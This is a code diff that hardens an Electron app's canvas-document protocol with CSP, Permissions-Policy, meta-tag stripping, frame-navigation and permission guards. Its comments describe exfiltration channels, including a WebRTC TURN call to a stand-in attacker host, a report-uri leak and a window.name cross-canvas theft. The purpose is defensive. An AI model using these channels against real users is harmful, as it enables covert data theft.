@@ -53,6 +53,32 @@ import { getServableVersion, isHtmlDocumentPath, ServableVersion } from './canva
 import bridgeSource from 'virtual:canvas-bridge'
 import analysisSource from 'virtual:canvas-analysis'
 
+// `connect-src 'self'` IS NOT EGRESS CONFINEMENT — the directive list below is,
+// and only because of the last three lines of it (adversarial review,
+// 2026-08-15). Fetch-directives govern FETCHES; a canvas document has channels
+// that are not fetches, and every one of them reaches the network with an
+// attacker-chosen label attached:
+//
+//   - WebRTC. `new RTCPeerConnection({iceServers:[{urls:'turn:x.attacker.tld',
+//     username:'<payload>'}]})` does DNS + UDP during ICE gathering and no
+//     fetch-directive covers it. Chromium's default is allow, so the CSP3
+//     `webrtc 'block'` directive is the only thing that stops it.
+//   - `<link rel=dns-prefetch|preconnect>` — a resolver hint, not a fetch, so
+//     no directive applies. ~63 bytes per DNS label, repeatable. It is stopped
+//     by nothing in CSP; the Permissions-Policy header below and the fact that
+//     a hostile document is only ever reached through a UAT root the user's own
+//     session registered are the mitigations, and it is NOT fully closed —
+//     stated plainly rather than papered over.
+//   - a page-authored `<meta http-equiv="Content-Security-Policy" …
+//     report-uri=…>` plus a deliberate self-violation. Violation reports are
+//     not subject to `connect-src`/`form-action`. `stripPageAuthoredCspMeta`
+//     removes the element at serve time so the page cannot declare one at all.
+//
+// This matters more here than it would for a browser tab: a UAT `contentRoot`
+// can be a whole project directory that the page reads same-origin, and
+// `captureHeadless` mounts and executes the document off-screen with no UI and
+// no approval prompt.
+//
 // Spec §3.1 default policy, with an explicit script-src and the same
 // defense-in-depth backstops the app renderer carries (object/base/form).
 // UAT builds are real static bundles — external same-origin scripts only.
@@ -63,6 +89,7 @@ const UAT_CSP =
   "style-src 'self' 'unsafe-inline'; " +
   "font-src 'self' data:; " +
   "connect-src 'self'; " +
+  "webrtc 'block'; " +
   "object-src 'none'; " +
   "base-uri 'self'; " +
   "form-action 'self'"
@@ -79,9 +106,62 @@ const DESIGN_CSP =
   "style-src 'self' 'unsafe-inline'; " +
   "font-src 'self' data:; " +
   "connect-src 'self'; " +
+  "webrtc 'block'; " +
   "object-src 'none'; " +
   "base-uri 'self'; " +
   "form-action 'self'"
+
+/**
+ * Powerful features a canvas document may never use, denied for EVERY origin
+ * (`=()` is the empty allowlist).
+ *
+ * The iframe `allow` attribute is the other half and both are needed: `allow`
+ * is the parent DELEGATING, this header is the document's own ceiling, and a
+ * document reached by a route that did not set `allow` (a nested frame, a
+ * future mount site) still lands under this. Unknown feature names are ignored
+ * by the parser, so listing more than Chromium implements costs nothing and
+ * covers a feature arriving in a later Chromium than the one this shipped on.
+ *
+ * Note what this does NOT cover: `rel=dns-prefetch`/`preconnect` have no
+ * Permissions-Policy feature and no CSP directive. See the CSP note above.
+ */
+export const CANVAS_PERMISSIONS_POLICY = [
+  'accelerometer',
+  'ambient-light-sensor',
+  'attribution-reporting',
+  'autoplay',
+  'battery',
+  'bluetooth',
+  'browsing-topics',
+  'camera',
+  'compute-pressure',
+  'display-capture',
+  'encrypted-media',
+  'fullscreen',
+  'gamepad',
+  'geolocation',
+  'gyroscope',
+  'hid',
+  'idle-detection',
+  'local-fonts',
+  'magnetometer',
+  'microphone',
+  'midi',
+  'payment',
+  'picture-in-picture',
+  'publickey-credentials-create',
+  'publickey-credentials-get',
+  'screen-wake-lock',
+  'serial',
+  'speaker-selection',
+  'storage-access',
+  'usb',
+  'web-share',
+  'window-management',
+  'xr-spatial-tracking',
+]
+  .map((feature) => `${feature}=()`)
+  .join(', ')
 
 const MIME_BY_EXT: Record<string, string> = {
   '.html': 'text/html; charset=utf-8',
@@ -125,9 +205,155 @@ function baseHeaders(contentType: string, csp?: string): Record<string, string> 
     'Content-Type': contentType,
     'X-Content-Type-Options': 'nosniff',
     'Cache-Control': 'no-store',
+    // On EVERY response, not just documents: the bridge and the analysis chunk
+    // are served from this same handler, and a header that is conditional is a
+    // header someone eventually forgets to make conditional correctly.
+    'Permissions-Policy': CANVAS_PERMISSIONS_POLICY,
   }
   if (csp) headers['Content-Security-Policy'] = csp
   return headers
+}
+
+// ---------------------------------------------------------------------------
+// Page-authored <meta http-equiv> pragmas
+// ---------------------------------------------------------------------------
+
+/**
+ * Decode the character references an HTML tokenizer would decode inside an
+ * ATTRIBUTE VALUE, so a comparison against that value cannot be dodged by
+ * spelling one letter as a numeric reference.
+ *
+ * Attribute NAMES are taken literally by the tokenizer — no references — which
+ * is why the scan below matches the name `http-equiv` as a plain string and
+ * only decodes the VALUE. The trailing semicolon is optional because a numeric
+ * reference without one is a parse error the tokenizer recovers from by
+ * consuming the reference anyway (`&#x63` decodes to `c`).
+ *
+ * Named references are not decoded: none of them produce an ASCII letter, so
+ * none can smuggle a character into `content-security-policy`.
+ */
+function decodeAttrCharRefs(value: string): string {
+  return value.replace(/&#(x[0-9a-f]+|[0-9]+);?/gi, (whole, digits: string) => {
+    const hex = digits[0] === 'x' || digits[0] === 'X'
+    const code = Number.parseInt(hex ? digits.slice(1) : digits, hex ? 16 : 10)
+    if (!Number.isFinite(code) || code < 0 || code > 0x10ffff) return whole
+    try {
+      return String.fromCodePoint(code)
+    } catch {
+      return whole
+    }
+  })
+}
+
+interface ScannedTag {
+  /** Index one past the tag's closing '>' (or the end of the string). */
+  end: number
+  attrs: Map<string, string>
+}
+
+/**
+ * Read one tag starting at `start` (which must point at its '<'), returning its
+ * attributes and where it ends.
+ *
+ * Quote-aware, because `[^>]*>` is not: a `report-uri https://x/?a=>b` inside a
+ * quoted value ends the match early, and a scanner that stops there disagrees
+ * with the browser about where the tag is.
+ */
+function scanTag(html: string, start: number): ScannedTag {
+  const attrs = new Map<string, string>()
+  let i = start + 1
+  // Skip the tag name.
+  while (i < html.length && !/[\s/>]/.test(html[i])) i++
+  while (i < html.length) {
+    while (i < html.length && /[\s/]/.test(html[i])) i++
+    if (i >= html.length) break
+    if (html[i] === '>') return { end: i + 1, attrs }
+    let name = ''
+    while (i < html.length && !/[\s/>=]/.test(html[i])) name += html[i++]
+    while (i < html.length && /\s/.test(html[i])) i++
+    let value = ''
+    if (html[i] === '=') {
+      i++
+      while (i < html.length && /\s/.test(html[i])) i++
+      const quote = html[i]
+      if (quote === '"' || quote === "'") {
+        i++
+        while (i < html.length && html[i] !== quote) value += html[i++]
+        i++ // past the closing quote
+      } else {
+        while (i < html.length && !/[\s>]/.test(html[i])) value += html[i++]
+      }
+    }
+    if (name.length > 0) attrs.set(name.toLowerCase(), value)
+  }
+  return { end: html.length, attrs }
+}
+
+/** Case-insensitive check that `html` has `tag` starting at `at`, followed by a
+ *  real tag-name boundary (so `<metadata>` is not `<meta>`). */
+function tagAt(html: string, at: number, tag: string): boolean {
+  if (html.slice(at, at + tag.length).toLowerCase() !== tag) return false
+  const next = html[at + tag.length]
+  return next === undefined || /[\s/>]/.test(next)
+}
+
+/** The two pragmas that deliver a policy — and with it a report endpoint. */
+const CSP_PRAGMA_RE = /^content-security-policy(-report-only)?$/
+
+/**
+ * Remove page-authored `<meta http-equiv="Content-Security-Policy">` elements
+ * before the document is served.
+ *
+ * WHY (adversarial review 2026-08-15, egress finding #3). A document that
+ * declares its own policy with `report-uri https://attacker.tld/…` and then
+ * deliberately violates it gets a channel that `connect-src` and `form-action`
+ * do not govern, carrying page-chosen data in `blocked-uri`. The element is
+ * therefore not something canvas content may author. (Chromium is documented to
+ * ignore `report-uri`/`report-to` delivered via `<meta>`; that is a property of
+ * one engine's conformance, not a boundary this serving path gets to lean on.)
+ *
+ * SCRIPT AND COMMENT REGIONS ARE SKIPPED. A blind regex over the whole document
+ * would also rewrite the characters `<meta http-equiv=…>` where they appear
+ * inside a JavaScript string or an HTML comment — text the browser never parses
+ * as a tag — silently corrupting real dist output. The scan tracks the same
+ * three regions the tokenizer does (comment, `<script>`, `<style>`) so what is
+ * removed is only what would actually have been an element.
+ */
+export function stripPageAuthoredCspMeta(html: string): string {
+  // One lowercased copy for the closing-tag searches: doing it per `<script>`
+  // would make a bundle with many script tags quadratic.
+  const lower = html.toLowerCase()
+  let out = ''
+  let i = 0
+  let copiedFrom = 0
+  while (i < html.length) {
+    const lt = html.indexOf('<', i)
+    if (lt < 0) break
+    if (html.startsWith('<!--', lt)) {
+      const close = html.indexOf('-->', lt + 4)
+      i = close < 0 ? html.length : close + 3
+      continue
+    }
+    const raw = (['script', 'style'] as const).find((name) => tagAt(html, lt + 1, name))
+    if (raw) {
+      const { end } = scanTag(html, lt)
+      const close = lower.indexOf(`</${raw}`, end)
+      i = close < 0 ? html.length : close + raw.length + 2
+      continue
+    }
+    if (!tagAt(html, lt + 1, 'meta')) {
+      i = lt + 1
+      continue
+    }
+    const { end, attrs } = scanTag(html, lt)
+    const httpEquiv = attrs.get('http-equiv')
+    if (httpEquiv !== undefined && CSP_PRAGMA_RE.test(decodeAttrCharRefs(httpEquiv).trim().toLowerCase())) {
+      out += html.slice(copiedFrom, lt)
+      copiedFrom = end
+    }
+    i = end
+  }
+  return copiedFrom === 0 ? html : out + html.slice(copiedFrom)
 }
 
 /** Windows reserved device basenames (CON/NUL/COM1/…) — kept in sync with the
@@ -250,7 +476,9 @@ export function serveFile(
     return null
   }
   if (isHtml) {
-    const html = injectBridgeTag(data.toString('utf8'))
+    // Strip BEFORE injecting: the bridge tag is ours and must not be walked by
+    // a scanner that is looking for someone else's markup.
+    const html = injectBridgeTag(stripPageAuthoredCspMeta(data.toString('utf8')))
     return new Response(method === 'HEAD' ? null : html, { status: 200, headers: baseHeaders(contentType, csp) })
   }
   const body = method === 'HEAD' ? null : new Uint8Array(data.buffer, data.byteOffset, data.byteLength)
@@ -398,4 +626,170 @@ export function registerCccUxSchemePrivileges(): void {
 /** Call inside app.whenReady(), before any window exists. */
 export function registerCccUxProtocolHandler(): void {
   protocol.handle(CCC_UX_SCHEME, (request) => handleCccUxRequest(request))
+}
+
+// ---------------------------------------------------------------------------
+// Frame navigation confinement (main-process backstop)
+// ---------------------------------------------------------------------------
+
+/** `ccc-ux://<canvasId>/<versionId>` for a URL, or null if it is not one of
+ *  ours. Nothing below the version id matters — a version is one origin+scope
+ *  and a document may move freely inside it (SPA links, reload). */
+function canvasScopeOf(url: string): string | null {
+  if (typeof url !== 'string' || url.length === 0) return null
+  let parsed: URL
+  try {
+    parsed = new URL(url)
+  } catch {
+    return null
+  }
+  if (parsed.protocol !== `${CCC_UX_SCHEME}:`) return null
+  const versionId = parsed.pathname.split('/').filter((s) => s.length > 0)[0] ?? ''
+  return `${parsed.hostname}/${versionId}`
+}
+
+/**
+ * May a frame currently at `currentUrl` navigate to `targetUrl`?
+ *
+ * The rule is one sentence: ONCE A FRAME IS SHOWING A CANVAS VERSION IT MAY
+ * ONLY EVER NAVIGATE WITHIN THAT VERSION. A frame that is not showing a canvas
+ * (`about:blank`, the app's own document, an empty string) is not this
+ * function's business and is allowed — that is the initial mount, and the app
+ * renderer's `will-navigate` + `frame-src ccc-ux:` govern it.
+ *
+ * WHAT THIS CLOSES (adversarial review, 2026-08-15). `will-navigate` fires for
+ * the MAIN FRAME ONLY, so before this the entire off-origin defence for canvas
+ * content was one `frame-src ccc-ux:` token in the renderer CSP — which permits
+ * the whole scheme, i.e. EVERY canvas:
+ *
+ *   - cross-canvas theft. `window.name` survives navigation and is
+ *     origin-agnostic: navigate to `ccc-ux://B`, read B's contentRoot
+ *     same-origin, stash it in `window.name`, navigate back to A, read it out.
+ *     A complete primitive, gated only on canvas ids being unguessable.
+ *   - version confusion. Self-navigating to another VERSION of the same canvas
+ *     defeats the iframe `key` mitigation the pane relies on: the renderer's
+ *     registered frame keeps its old `versionId`, so `canvas_snapshot` is
+ *     answered from a different version's document than the one main stamps
+ *     onto the result.
+ *
+ * Both are the same shape and both are closed by the same comparison, which is
+ * why this is one function and not two.
+ */
+export function isCanvasFrameNavigationAllowed(currentUrl: string, targetUrl: string): boolean {
+  const from = canvasScopeOf(currentUrl)
+  if (from === null) return true
+  return canvasScopeOf(targetUrl) === from
+}
+
+/** The shape of Electron's `will-frame-navigate` event, narrowed to what the
+ *  guard reads. Structural so the guard is testable without an Electron window
+ *  — an untestable guard is one nobody can prove still works. */
+export interface CanvasFrameNavigationDetails {
+  url: string
+  isMainFrame: boolean
+  frame?: { url?: string } | null
+  initiator?: { url?: string } | null
+  preventDefault: () => void
+}
+
+export interface FrameNavigationEmitter {
+  on(event: 'will-frame-navigate', listener: (details: CanvasFrameNavigationDetails) => void): unknown
+}
+
+/**
+ * Install the subframe navigation guard on the main window's webContents.
+ *
+ * The main frame is deliberately left alone: `will-navigate` already cancels
+ * every main-frame navigation, and duplicating that here would put two owners
+ * on one rule.
+ *
+ * BOTH the navigating frame's current URL and the INITIATOR's are checked, and
+ * either one may refuse. `details.frame` is documented as possibly null (the
+ * frame may already have navigated or been destroyed), and a guard whose only
+ * input can be null is a guard with an off switch; the initiator covers that
+ * case, and for a self-navigation the two are the same frame anyway.
+ */
+export function installCanvasFrameNavigationGuard(contents: FrameNavigationEmitter): void {
+  contents.on('will-frame-navigate', (details) => {
+    try {
+      if (details.isMainFrame) return
+      const sources = [details.frame?.url, details.initiator?.url]
+      for (const source of sources) {
+        if (typeof source !== 'string') continue
+        if (isCanvasFrameNavigationAllowed(source, details.url)) continue
+        details.preventDefault()
+        console.warn(
+          `[ccc-ux] blocked a canvas frame navigation out of its version (from ${source} to ${details.url})`,
+        )
+        return
+      }
+    } catch (err) {
+      // A throw inside an Electron event listener does not cancel anything, so
+      // failing closed has to be explicit.
+      try {
+        details.preventDefault()
+      } catch {
+        /* nothing further to do */
+      }
+      console.warn('[ccc-ux] frame navigation guard failed, navigation refused:', err)
+    }
+  })
+}
+
+// ---------------------------------------------------------------------------
+// Permission requests
+// ---------------------------------------------------------------------------
+
+/** True for a document served by this protocol. Origin-scoped rather than
+ *  blanket so the guard below cannot be widened by accident into "deny the app
+ *  its own clipboard". */
+export function isCanvasOrigin(url: string | undefined | null): boolean {
+  if (typeof url !== 'string' || url.length === 0) return false
+  try {
+    return new URL(url).protocol === `${CCC_UX_SCHEME}:`
+  } catch {
+    return false
+  }
+}
+
+export interface PermissionCapableSession {
+  setPermissionRequestHandler(
+    handler:
+      | ((
+          webContents: unknown,
+          permission: string,
+          callback: (granted: boolean) => void,
+          details?: { requestingUrl?: string },
+        ) => void)
+      | null,
+  ): void
+  setPermissionCheckHandler(
+    handler: ((webContents: unknown, permission: string, requestingOrigin: string, details?: unknown) => boolean) | null,
+  ): void
+}
+
+/**
+ * Deny every powerful-feature request made by canvas content.
+ *
+ * Electron grants permission requests by default and the app installed no
+ * handler on the DEFAULT session at all (the one in account-web/artifacts.ts is
+ * on that window's own partition), so until now a canvas document could ask for
+ * geolocation, camera, microphone, midi or clipboard-read and be granted
+ * silently — and `captureHeadless` runs such a document with no UI at all.
+ *
+ * SCOPED TO ccc-ux ORIGINS, NOT BLANKET, AND THAT IS DELIBERATE. The default
+ * session also serves the app's own renderer, whose `navigator.clipboard.write`
+ * calls (the Copy buttons on this very feature's empty state, on Cloud Agents,
+ * and in both Excalidraw panes) go through this handler as
+ * `clipboard-sanitized-write`. `() => false` would break a shipped feature to
+ * close a canvas hole; refusing by origin closes the hole exactly. Non-canvas
+ * origins are granted, which is the behaviour that shipped.
+ */
+export function installCanvasPermissionGuard(sess: PermissionCapableSession): void {
+  sess.setPermissionRequestHandler((_webContents, _permission, callback, details) => {
+    callback(!isCanvasOrigin(details?.requestingUrl))
+  })
+  // The synchronous half: `navigator.permissions.query`, device enumeration and
+  // the checks Chromium makes without a request. Same origin rule.
+  sess.setPermissionCheckHandler((_webContents, _permission, requestingOrigin) => !isCanvasOrigin(requestingOrigin))
 }
